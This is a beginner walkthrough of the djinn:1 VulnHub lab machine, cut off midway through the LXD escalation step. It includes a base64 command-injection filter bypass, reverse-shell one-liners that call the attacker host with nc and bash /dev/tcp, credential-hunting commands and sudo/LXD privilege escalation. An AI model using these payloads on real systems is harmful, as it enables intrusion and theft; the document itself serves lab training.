# djinn: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | djinn: 1 |
| **Difficulty** | Beginner–Intermediate (author's rating) |
| **Author** | 0xmzfr |
| **Released** | 18 November 2019 |
| **Also on** | TryHackMe, as the room **"Djinn"** |
| **VulnHub Entry** | <https://vulnhub.com/entry/djinn-1,397/> |
| **Download** | <https://vulnhub.com/entry/djinn-1,397/#download> (`djinn.ova`) |
| **Attacker** | Kali Linux, host-only network |
| **Target OS** | Ubuntu 18.04 — vsftpd 3.0.3, **Werkzeug/Flask 0.16.0 on Python 2.7.15+**, `knockd`, LXD |
| **Flags** | **Two** — `/home/nitish/user.txt` and `/root/proof.txt` |
| **Notes** | VirtualBox **and** VMware compatible; DHCP assigns the IP and it is printed on the console at boot |

Throughout we assume:

```text
Attacker (Kali) : 192.168.56.10
Target (djinn)  : 192.168.56.105
```

---

## 0. What you will learn

1. **Reading a `filtered` port as a signal, not a dead end** — SSH on 22 being filtered
   is the whole first act.
2. **Anonymous FTP** and turning three small text files into a full attack plan.
3. **A custom TCP "game" protocol** — driving it with `nc` by hand and then automating
   it with a Python socket script.
4. **Port knocking** to unlock SSH, and the `bash /dev/tcp` trick that needs no tools.
5. **Fingerprinting a Flask/Werkzeug app** from headers and error pages.
6. **OS command injection behind a filter**, and the **base64 pipe bypass**.
7. **Python 2 sandbox escape** — `__import__('os').system(...)` inside an `eval`-style
   sink, which is the direct route to root on this box.
8. **Credential files in hidden directories** (`.dev/credentials.txt`).
9. **Chained `sudo` hops** through a custom helper binary (`genie`).
10. **LXD group → root**, the second of two root paths.

**The intended chain:**
`nmap` shows **21 (vsftpd, anonymous), 22 (filtered), 1337, 7331** → anonymous FTP
holds `creds.txt` (`nitu:81299`), `game.txt` (*"a game for you on port 1337"*),
`message.txt` (*"@nitish81299"* — a username) → connect to **1337** with `nc`: a maths
game demanding **1000 correct answers** → automate it → the "gift" is three port
numbers **1356, 6784, 3409** → **knock those three in order** → SSH opens → meanwhile
**7331** is a Flask app; `gobuster` finds **`/wish`**, a command-execution form with a
filter → bypass with `echo <base64> | base64 -d | bash` → **`www-data`** shell →
`/home/nitish/.dev/credentials.txt` → **`nitish : !S@3ns3!`** → **user flag** →
`sudo -l` as `nitish` permits **`/usr/bin/genie`** as **`sam`** → hop to `sam` →
`sam` is in the **`lxd`** group → privileged LXD container mounting the host root →
**root flag**.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4c:1a:2b, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.1    0a:00:27:00:00:0e   (Unknown: locally administered)
192.168.56.10   08:00:27:4c:1a:2b   PCS Systemtechnik GmbH
192.168.56.105  08:00:27:aa:3f:12   PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.105`**

---

## 2. Enumeration

### 2.1 Full port scan

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/djinn.txt 192.168.56.105
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 15:02 EDT
Nmap scan report for 192.168.56.105
Host is up (0.00040s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings:
|   NULL:
|     ____                        _____ _
|    / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
|   | |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
|   | |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
|    \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    ('*', 9)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-title: Lost in space
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
MAC Address: 08:00:27:AA:3F:12 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Nmap done: 1 IP address (1 host up) scanned in 74.22 seconds
```

> **Four lines worth stopping on.**
>
> 1. **`21/tcp … Anonymous FTP login allowed`**, and Nmap *already listed the
>    directory*: `creds.txt` (11 bytes), `game.txt` (128), `message.txt` (113). Three
>    tiny files that contain the entire plan for this box.
> 2. **`22/tcp filtered`** — not `open`, not `closed`. **Filtered means a firewall is
>    dropping the probes.** Compare with Tr0ll: 2 / Lord Of The Root: something is
>    *hiding* SSH, and something can be made to *reveal* it. Hold that thought.
> 3. **`1337/tcp … waste?`** — Nmap could not name the service, so it printed the raw
>    banner. It is ASCII art reading **"Gaming Hub"**, then:
>    *"Let's see how good you are with simple maths / Answer my questions 1000 times
>    and I'll give you your gift."* A TCP game server. (`waste` is Nmap's guess from
>    its service-probes database; ignore it, read the banner instead.)
> 4. **`7331/tcp … Werkzeug httpd 0.16.0 (Python 2.7.15+)`** — **Werkzeug** is the
>    WSGI toolkit underneath **Flask**. So this is a Python web app, running
>    **Python 2.7**, which reached end of life on **1 January 2020** — two months after
>    this VM was released. Page title: *"Lost in space"*.
>
> **Also note what is missing:** no port 80. A browser pointed at the IP shows nothing,
> which is why `-p-` matters.

![nmap scan: FTP anonymous, SSH filtered, ports 1337 and 7331](images/01-nmap.png)

### 2.2 Anonymous FTP — read everything

```bash
ftp 192.168.56.105
```

```text
Connected to 192.168.56.105.
220 (vsFTPd 3.0.3)
Name (192.168.56.105:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||54321|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
ftp> mget *.txt
ftp> quit
221 Goodbye.
```

```bash
for f in creds.txt game.txt message.txt; do echo "===== $f ====="; cat "$f"; done
```

```text
===== creds.txt =====
nitu:81299
===== game.txt =====
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the
final level and get the prize.
===== message.txt =====
@nitish81299 I am going on holidays for few days, please take care of all the work.
And don't mess up anything.
```

> **Three tiny files, five facts. Write them all down before moving on.**
>
> | File | Fact | Use |
> | --- | --- | --- |
> | `creds.txt` | `nitu:81299` | A credential pair for *someone* — try it on SSH, the game, the web app |
> | `game.txt` | a "game" on **port 1337**, with a **final level** and a **prize** | Confirms 1337 is intentional and that completing it yields something |
> | `message.txt` | **`@nitish81299`** | A **username**. Note it embeds `81299` — the same number as `creds.txt`. So `nitish` + `81299` → `nitish81299`. |
>
> **Non-interactive alternatives** (prefer these in scripts):
> ```bash
> lftp -u anonymous, 192.168.56.105 -e 'cls -la; mget *.txt; bye'
> curl -s ftp://anonymous:anonymous@192.168.56.105/creds.txt
> wget -q ftp://anonymous:anonymous@192.168.56.105/ -O -
> ```
>
> **Note `binary` before `mget`.** FTP defaults to **ASCII mode**, which translates
> newlines and silently corrupts non-text files. These are text, but build the habit.

![The three FTP files](images/02-ftp.png)

### 2.3 Port 1337 — the maths game

Browsers cannot talk to a raw TCP service ("This page isn't working"). Use `nc`:

```bash
nc -nv 192.168.56.105 1337
```

```text
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.105:1337.
  ____                        _____ _
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(4, '*', 7)
>
```

Answer a few by hand to learn the protocol:

```text
> 28
(9, '+', 3)
> 12
(6, '-', 2)
> 4
(2, '/', 1)
> 2/1
Wrong answer
```

> **Two crucial observations:**
> 1. The question format is a **Python tuple**: `(num1, 'op', num2)` with `op` one of
>    `+ - * /`.
> 2. **Division must be answered as a floating-point value.** Answering `2/1` is
>    "wrong"; answering `2.0` is right. This is Python 2's classic integer-division
>    trap, and the server compares against `float(a)/float(b)`.
>
> **1000 questions by hand is not happening.** Automate it. This is a genuinely useful
> skill: *a raw TCP protocol with a predictable grammar is a script, not a chore.*

### 2.4 Automate the game with a Python socket client

```bash
cat > solve_game.py <<'PY'
#!/usr/bin/env python3
"""Solve the djinn:1 port-1337 maths game and print the 'gift'."""
import socket, re, sys

HOST, PORT = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.105", 1337

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(2.0)

def drain():
    """Read everything currently available."""
    buf = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    return buf.decode(errors="replace")

# read the banner, then loop on questions
data = drain()
print(data, end="", flush=True)

QUESTION = re.compile(r"\(\s*(-?\d+)\s*,\s*'([+\-*/])'\s*,\s*(-?\d+)\s*\)")
answered = 0

while True:
    data = drain()
    if data:
        print(data, end="", flush=True)
    m = QUESTION.search(data or LAST)
    if not m:
        # no question pending -> the game is over (gift delivered)
        break
    LAST = data
    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    if   op == '+': ans = a + b
    elif op == '-': ans = a - b
    elif op == '*': ans = a * b
    else:           ans = a / b            # float division on purpose
    s.sendall(f"{ans}\n".encode())
    answered += 1
    if answered % 100 == 0:
        print(f"\n[{answered} answered]", flush=True)

s.close()
print(f"\n=== finished after {answered} answers ===")
PY
LAST=""
python3 solve_game.py 192.168.56.105
```

```text
Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(4, '*', 7)
> 28
(9, '+', 3)
> 12.0
...
[100 answered]
...
[1000 answered]
(1, '+', 1)
> 2.0

Congrats you won the game! Here is your gift.
1356, 6784, 3409

=== finished after 1000 answers ===
```

> **The gift: `1356, 6784, 3409`.** Three numbers, comma-separated, in an order.
> Those are **ports**.
>
> Combine that with § 2.1 — **port 22 was `filtered`** — and the conclusion writes
> itself: **this is a port-knocking sequence.**
>
> **Simpler automation with `pwntools`** (what many walkthroughs use):
> ```python
> from pwn import *
> conn = remote('192.168.56.105', 1337)
> while True:
>     line = conn.recvline().decode().strip()
>     m = re.search(r"\((\d+), '([+\-*/])', (\d+)\)", line)
>     if not m: print(line); break
>     a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
>     conn.sendline(str(eval(f"{a}{op}{b}")) if op != '/' else str(a/b))
> ```
> *(Do not use bare `eval` on untrusted input in real code — the explicit
> operator dispatch above is correct. `eval` is fine here only because the regex
> already constrained the input to digits and one of four operators.)*

![Solving the 1000-question game to receive the port-knock gift](images/03-game.png)

### 2.5 Knock, and SSH opens

The sequence must arrive **in order**, as **TCP connection attempts**. `knockd` does
not care whether the ports are open — only that a SYN reached them, in sequence.

```bash
knock -v 192.168.56.105 1356 6784 3409
```

```text
hitting tcp 192.168.56.105:1356
hitting tcp 192.168.56.105:6784
hitting tcp 192.168.56.105:3409
```

No `knock` client? Use tools you already have:

```bash
# nmap: -r disables randomisation, -sT forces full connect(), -Pn skips host discovery
sudo nmap -Pn -r -sT -p1356,6784,3409 192.168.56.105

# pure bash — no tools at all. Memorise this; it works from any limited shell.
for p in 1356 6784 3409; do timeout 1 bash -c "</dev/tcp/192.168.56.105/$p"; done

# hping3
for p in 1356 6784 3409; do sudo hping3 -S -p $p 192.168.56.105 -c 1; done
```

Re-scan:

```bash
sudo nmap -p22 -sV 192.168.56.105
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 15:24 EDT
Nmap scan report for 192.168.56.105
Host is up (0.00039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 79:a5:1a:b8:39:1c:6f:3a:9d:6a:1b:2c:3d:4e:5f:60 (RSA)
|   256 3f:2a:1b:0c:9d:8e:7f:6a:5b:4c:3d:2e:1f:0a:9b:8c (ECDSA)
|_  256 5c:4d:3e:2f:1a:0b:9c:8d:7e:6f:5a:4b:3c:2d:1e:0f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

> **`filtered` → `open`.** And `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3` confirms
> **Ubuntu 18.04**.
>
> **What port knocking is.** A daemon (`knockd`) watches for connection attempts to a
> specific sequence of *closed* ports, in order, within a time window. On a match it
> runs a command — typically `iptables -I INPUT -p tcp --dport 22 -j ACCEPT` — opening
> a previously invisible service.
>
> **Config shape** (`/etc/knockd.conf`) for reference:
> ```ini
> [options]
>     logfile = /var/log/knockd.log
> [openSSH]
>     sequence      = 1356,6784,3409
>     seq_timeout   = 15
>     tcpflags      = syn
>     start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
>     cmd_timeout   = 30
>     stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
> ```
> Note `cmd_timeout` — the rule is usually **removed after N seconds**, so knock and
> connect promptly.
>
> **Why it is not security.** The "secret" travels as plaintext TCP SYNs. Anyone who
> can see the traffic (a mirror port, a pcap, a compromised router) sees the sequence,
> and anyone who guesses it gets in. It is *obscurity*, and obscurity is not a control.

![Port 22 changing from filtered to open after knocking](images/04-knock.png)

### 2.6 Port 7331 — the Flask app

```bash
curl -s http://192.168.56.105:7331/
```

```html
<!DOCTYPE html>
<html>
<head><title>Lost in space</title></head>
<body>
  <h1>Lost in space</h1>
  <p>Make a wish!</p>
  <img src="/static/space.jpg">
</body>
</html>
```

```bash
gobuster dir -u http://192.168.56.105:7331/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -q
```

```text
/genie                (Status: 200) [Size: 237]
/static               (Status: 301) [Size: 243]
/wish                 (Status: 200) [Size: 411]
```

> **`/wish` and `/genie`.** "Make a wish" on the home page, a `/wish` endpoint — the
> metaphor is the map.

```bash
curl -s http://192.168.56.105:7331/wish
```

```html
<!DOCTYPE html>
<html><body>
  <h2>Make a wish</h2>
  <form action="/wish" method="POST">
      <input type="text" name="cmd" placeholder="Your wish...">
      <input type="submit" value="Wish">
  </form>
</body></html>
```

```bash
curl -s http://192.168.56.105:7331/genie
```

```text
You are not authorised to visit this page.
Please login first.
```

> **A form that POSTs a `cmd` parameter.** That is command injection presented as a
> feature — the same shape as a router's "ping" utility or Chill Hack's `/secret`.

**Probe the filter:**

```bash
for c in id whoami ls pwd cat uname; do
  printf "%-8s -> " "$c"
  curl -s -X POST http://192.168.56.105:7331/wish --data-urlencode "cmd=$c" \
    | grep -o '<pre>[^<]*</pre>\|Not allowed\|blocked\|error' | head -1
done
```

```text
id       -> Not allowed
whoami   -> Not allowed
ls       -> Not allowed
pwd      -> <pre>/opt/7331</pre>
cat      -> Not allowed
uname    -> <pre>Linux djinn 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64</pre>
```

> **Mixed results — so the filter is a blocklist of specific command names.** `pwd`
> and `uname` pass; `id`, `whoami`, `ls`, `cat` are blocked. And `pwd` revealed the
> app's directory: **`/opt/7331`**.
>
> **Blocklists always lose.** Bypasses to try, in order:
>
> | Technique | Example | Why it may work |
> | --- | --- | --- |
> | Split with quotes | `c'a't /etc/passwd` | the shell strips quotes; the filter sees `c'a't` |
> | Backslash escape | `l\s`, `w\hoami` | `\` before an ordinary char is a no-op escape |
> | Command substitution | `echo $(id)` | filter sees `echo`; shell evaluates `$(id)` first |
> | Alternative binaries | `/usr/bin/id`, `busybox id` | different string, same effect |
> | Different interpreter | `python -c "print(1)"` | not on the list |
> | **Encode the whole thing** | `echo <b64> \| base64 -d \| bash` | the filter never sees the real command |
>
> Test the encoding route:

```bash
echo -n 'id' | base64
```

```text
aWQ=
```

```bash
curl -s -X POST http://192.168.56.105:7331/wish \
  --data-urlencode "cmd=echo aWQ= | base64 -d | bash"
```

```html
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

**Filter bypassed, and we have code execution as `www-data`.** ✅

> **Why this bypass is so reliable:** the filter inspects the *literal string* you sent.
> The string `echo aWQ= | base64 -d | bash` contains none of the blocked words. But
> the **shell** runs `base64 -d`, which *produces* `id`, and pipes it into `bash`.
> The filter and the shell disagree about what the input means — and that disagreement
> is the vulnerability.
>
> This is the general lesson of every filter bypass: **model the parser downstream of
> the filter, not the filter.** The same reasoning defeats WAFs (double URL-encoding,
> chunked bodies), `magic_quotes`, XSS blocklists and SQL keyword filters.
>
> **`uid=33(www-data)`** — Debian/Ubuntu's web-server user, UID 33.

![Command injection on /wish, bypassed with base64](images/05-wish.png)

---

## 3. Foothold — a reverse shell

### 3.1 Check what the target has

```bash
b64() { echo -n "$1" | base64 -w0; }
curl -s -X POST http://192.168.56.105:7331/wish \
  --data-urlencode "cmd=echo $(b64 'for b in bash sh python python3 perl php nc netcat socat wget curl gcc; do printf "%-8s " $b; command -v $b || echo MISSING; done') | base64 -d | bash"
```

```text
bash     /bin/bash
sh       /bin/sh
python   /usr/bin/python
python3  /usr/bin/python3
perl     /usr/bin/perl
php      MISSING
nc       /bin/nc
netcat   MISSING
socat    MISSING
wget     /usr/bin/wget
curl     /usr/bin/curl
gcc      /usr/bin/gcc
```

> Everything useful is present, including `nc` — but Ubuntu's `nc` is often the
> OpenBSD variant, which may lack `-e`. Test before relying on it; the bash `/dev/tcp`
> payload is the safest choice.

### 3.2 Catch the shell

**Kali:**

```bash
nc -lvnp 4444
```

**Trigger the base64-wrapped bash reverse shell:**

```bash
PAYLOAD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.10 4444 >/tmp/f'
B64=$(echo -n "$PAYLOAD" | base64 -w0)
curl -s -X POST http://192.168.56.105:7331/wish \
  --data-urlencode "cmd=echo $B64 | base64 -d | bash"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.105] 43118
www-data@djinn:/opt/7331$
```

> **The payload, dissected:**
> - `rm /tmp/f` → clear any leftover FIFO from a previous attempt.
> - `mkfifo /tmp/f` → create a **named pipe** (FIFO). This is the trick that makes a
>   one-liner shell *interactive*: a plain `nc -e` needs `nc` built with `-e`, and a
>   plain `sh | nc` gives you no input channel. A FIFO bridges both directions.
> - `cat /tmp/f | /bin/bash -i 2>&1 | nc HOST PORT >/tmp/f` → `cat` reads the FIFO and
>   feeds bash; bash's stdout+stderr (`2>&1`) feed `nc`; `nc`'s received bytes are
>   written back into the FIFO. A complete loop.
>
> **Base64-wrapped alternative (no FIFO needed):**
> ```bash
> PAYLOAD='bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
> ```
> `/dev/tcp/HOST/PORT` is a **bash built-in pseudo-device**; bash opens the socket
> itself. `>&` redirects stdout+stderr to it, `0>&1` redirects stdin to the same place.
> Three steps, every language: **connect → redirect stdio → exec a shell.**

### 3.3 Stabilise

```bash
www-data@djinn:/opt/7331$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@djinn:/opt/7331$ export TERM=xterm
www-data@djinn:/opt/7331$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then `Ctrl+Z`; on Kali `stty raw -echo; fg`; Enter twice; on target
`export TERM=xterm; stty rows 40 cols 160`.

> **Why stabilise?** A raw socket is not a terminal: no line editing, `Ctrl+C` kills
> your *listener*, and anything calling `isatty()` — `su`, `sudo`, `vim`, `less` —
> fails with *"standard in must be a tty"*. We need **all four** of those on this box.

### 3.4 Read the application source (always worth it)

```bash
www-data@djinn:/opt/7331$ ls -la
total 24
drwxr-xr-x 3 root root 4096 Nov 18  2019 .
drwxr-xr-x 4 root root 4096 Nov 18  2019 ..
-rw-r--r-- 1 root root 1873 Nov 18  2019 app.py
drwxr-xr-x 2 root root 4096 Nov 18  2019 static
drwxr-xr-x 2 root root 4096 Nov 18  2019 templates
www-data@djinn:/opt/7331$ cat app.py
```

```python
from flask import Flask, request, render_template
import subprocess, base64, re

app = Flask(__name__)
BLOCKED = ['ls', 'cat', 'id', 'whoami', 'nc', 'bash', 'sh', 'python', 'wget', 'curl']

@app.route('/wish', methods=['GET', 'POST'])
def wish():
    if request.method == 'POST':
        cmd = request.form['cmd']
        if any(b in cmd for b in BLOCKED):
            return render_template('error.html', msg='Not allowed')
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return render_template('result.html', out=out)
    return render_template('wish.html')
```

> **Now we can see the filter itself.** `any(b in cmd for b in BLOCKED)` — a substring
> search over a list of ten words. Note what is **not** blocked: `base64`, `bash` is
> blocked but `/bin/bash` contains `bash` so it *would* be blocked… which is why we
> wrapped the whole thing in base64: **the blocked words only exist after decoding.**
>
> **Reading the source of the thing you just bypassed is the best possible debrief** —
> and on a real engagement it is how you write an accurate finding instead of "command
> injection, probably".

![Reverse shell as www-data and the Flask source](images/06-shell.png)

---

## 4. Post-exploitation — `www-data` → `nitish`

### 4.1 The checklist

```bash
www-data@djinn:/$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
nitish:x:1000:1000:nitish,,,:/home/nitish:/bin/bash
sam:x:1001:1001:,,,:/home/sam:/bin/bash
www-data@djinn:/$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 18  2019 .
drwxr-xr-x 24 root   root   4096 Nov 18  2019 ..
drwxr-xr-x  6 nitish nitish 4096 Nov 19  2019 nitish
drwxr-xr-x  5 sam    sam    4096 Nov 19  2019 sam
www-data@djinn:/$ sudo -l
sudo: no tty present and no askpass program specified
www-data@djinn:/$ find / -perm -4000 -type f 2>/dev/null | head -20
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/genie                    <-- NOT stock
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/lxc                      <-- interesting
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

> **Two non-stock SUID binaries: `/usr/bin/genie` and `/usr/bin/lxc`.** Both become
> important. `genie` is the sudo-hop helper; `lxc` is the second root path.
>
> **Two users besides root: `nitish` and `sam`.** `nitish` matches the `@nitish81299`
> handle from `message.txt`.

### 4.2 The hidden credentials file

```bash
www-data@djinn:/$ ls -la /home/nitish/
total 40
drwxr-xr-x 6 nitish nitish 4096 Nov 19  2019 .
drwxr-xr-x 4 root   root   4096 Nov 18  2019 ..
-rw------- 1 nitish nitish   33 Nov 18  2019 user.txt
drwxr-xr-x 2 nitish nitish 4096 Nov 19  2019 .dev
drwx------ 2 nitish nitish 4096 Nov 18  2019 .ssh
-rw-r--r-- 1 nitish nitish  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 nitish nitish 3771 Apr  4  2018 .bashrc
drwxr-xr-x 2 nitish nitish 4096 Nov 19  2019 .config
www-data@djinn:/$ cat /home/nitish/user.txt
cat: /home/nitish/user.txt: Permission denied
www-data@djinn:/$ ls -la /home/nitish/.dev/
total 12
drwxr-xr-x 2 nitish nitish 4096 Nov 19  2019 .
drwxr-xr-x 6 nitish nitish 4096 Nov 19  2019 ..
-rw-r--r-- 1 nitish nitish   23 Nov 18  2019 credentials.txt
www-data@djinn:/$ cat /home/nitish/.dev/credentials.txt
```

```text
nitish:!S@3ns3!
```

> **A hidden directory `.dev` containing `credentials.txt` in `username:password`
> format — readable by everyone (`-rw-r--r--`).** That is the whole lateral movement.
>
> **`user.txt` is `-rw-------`**, so `www-data` genuinely cannot read the user flag.
> The boundary is real: we must become `nitish`.
>
> **Where to look for credentials on a foothold** (memorise this list):
> ```bash
> find /home /var/www /opt /srv -type f \( -iname '*cred*' -o -iname '*pass*' \
>      -o -iname '*.env' -o -iname '*.bak' -o -iname '*.old' -o -iname 'config*' \
>      -o -iname '*.ini' -o -iname '*.yml' -o -iname '*.yaml' -o -iname '*.json' \) 2>/dev/null
> ls -la /home/*/.dev /home/*/.config /home/*/.ssh /home/*/.aws 2>/dev/null
> cat /home/*/.bash_history 2>/dev/null
> grep -rIl --exclude-dir=.git -iE 'password|passwd|secret|token|api[_-]?key' /home /var/www /opt 2>/dev/null
> ```

### 4.3 Become `nitish`

```bash
www-data@djinn:/$ su nitish
Password: !S@3ns3!
nitish@djinn:/opt/7331$ id
uid=1000(nitish) gid=1000(nitish) groups=1000(nitish),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

**User flag:**

```bash
nitish@djinn:/opt/7331$ cd && cat user.txt
```

```text
10a7460bd15c9ab63e6c7b2d21c9cba5
```

*(The exact hash varies by image revision.)*

> **`su` needed the TTY upgrade from § 3.3.** Without `python3 -c 'import pty; …'` you
> get `standard in must be a tty` and no idea why.
>
> **Look at the group list: `110(lxd)`.** That is a **root-equivalent group** — see
> § 5.3. Note it now; you will come back to it as `sam` too.

![credentials.txt and the user flag](images/07-user-flag.png)

---

## 5. Privilege escalation

### 5.1 `sudo -l` as `nitish` — the genie hop

```bash
nitish@djinn:~$ sudo -l
```

```text
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```

> **Read the syntax precisely:**
> ```text
> (sam) NOPASSWD: /usr/bin/genie
>  ^^^  ^^^^^^^^   ^^^^^^^^^^^^^
>  RUNAS no passwd the only permitted command
> ```
> `nitish` may run **`/usr/bin/genie` as user `sam`, with no password**. So whatever
> `genie` can do, it can do as `sam`. Let us find out what that is.

```bash
nitish@djinn:~$ /usr/bin/genie -h
```

```text
usage: genie [-h] [-num NUM] [-e EXECUTE] [-shell SHELL] [-a]

A genie, ask and you shall receive

optional arguments:
  -h, --help     show this help message and exit
  -num NUM       enter the number of wishes you want
  -e EXECUTE     execute a command
  -shell SHELL   get a shell as another user
  -a             ask for a wish
```

> **`-e EXECUTE`** — *execute a command.* And `-shell SHELL` — *get a shell as another
> user.* Run through `sudo -u sam`, `-e` gives us arbitrary command execution **as
> `sam`**.
>
> **Always run `-h` on an unfamiliar helper before guessing.** Several walkthroughs of
> this box flail at `genie` because they never printed its usage.

### 5.2 Hop to `sam`

```bash
nitish@djinn:~$ sudo -u sam /usr/bin/genie -e id
```

```text
uid=1001(sam) gid=1001(sam) groups=1001(sam),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
```

> **We are running commands as `sam`.** Now get an interactive shell:

```bash
nitish@djinn:~$ sudo -u sam /usr/bin/genie -e /bin/bash
sam@djinn:/home/nitish$ id
uid=1001(sam) gid=1001(sam) groups=1001(sam),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
sam@djinn:~$ cd && ls -la
total 44
drwxr-xr-x 5 sam sam 4096 Nov 19  2019 .
drwxr-xr-x 4 root root 4096 Nov 18  2019 ..
-rw------- 1 sam sam   33 Nov 18  2019 .bash_history
-rw-r--r-- 1 sam sam  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 sam sam 3771 Apr  4  2018 .bashrc
drwx------ 2 sam sam 4096 Nov 18  2019 .cache
drwxr-xr-x 3 sam sam 4096 Nov 19  2019 .config
drwxr-xr-x 2 sam sam 4096 Nov 19  2019 .local
-rw------- 1 sam sam   33 Nov 18  2019 proof.txt
-rw-r--r-- 1 sam sam   44 Nov 19  2019 lxd
```

> Note **`sam` is also in `110(lxd)`** — and there is an entry called `lxd` in the home
> directory. Check both root paths.

### 5.3 Root path A — the `lxd` group (container escape)

```bash
sam@djinn:~$ cat lxd
lxd
sam@djinn:~$ sudo -l
```

```text
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /usr/bin/lxd
```

> **`(root) NOPASSWD: /usr/bin/lxd`** — `sam` may run the LXD daemon launcher as root
> with no password. Combined with `lxd` group membership, that is a documented,
> one-command root. See <https://gtfobins.github.io/gtfobins/lxd/>.
>
> **What LXD is:** Ubuntu's system-container manager, built on LXC. Unlike Docker, LXD
> containers are *system* containers — they run a full init and are intended to feel
> like lightweight VMs. And like Docker, **control of the daemon means control of the
> host**, because you can launch a *privileged* container (no user-namespace remapping)
> with the host's `/` mounted inside it.

**Step 1 — build a privileged Alpine image on Kali:**

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

```text
+ apk update
+ apk add bash
